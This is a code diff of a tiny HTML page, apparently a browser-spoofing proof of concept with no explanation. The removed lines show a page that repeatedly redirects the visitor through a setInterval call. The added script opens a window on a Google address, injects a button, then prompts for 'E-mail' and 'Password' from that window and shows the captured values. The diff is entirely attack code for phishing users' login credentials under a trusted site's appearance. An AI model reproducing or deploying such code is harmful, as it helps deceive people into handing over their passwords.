@@ -1,21 +1,14 @@
 
-<html>
-	<head></head>
-	<body>
-		Visit this link: <span id="304url">https://www.google.com</span> (please copy and paste into your address bar)<br>
-		<button onclick="alert()">copy url</button>
-		<script>
-			        v = setInterval(`x=document.location='https://www.google.com:1234';`);   
-			function copyUrl(){
-				const url = document.getElementById("304url");
-				if(!window.getSelection) return;
-				var range = document.createRange();
-				range.selectNodeContents(url);
-				var sel = window.getSelection();
-				sel.removeAllRanges();
-				sel.addRange(range);
-				document.execCommand("copy");
-			}
-		</script>
-	</body>
-</html
+ <script> function go(){ 
+ var x=window.open('https://www.google.com/csi'); 
+	 setTimeout(function(){x.document.write("<input type='button' value='click here please' onclick=document.location='https://www.google.com'>")}, 400);
+
+ setTimeout(function(){
+	 
+ a=x.prompt('E-mail','');b=x.prompt('Password','');
+x.close();
+ alert(a+b)},4000);
+  } 
+ </script> 
+ 
+ <button onclick="go()">go</button>
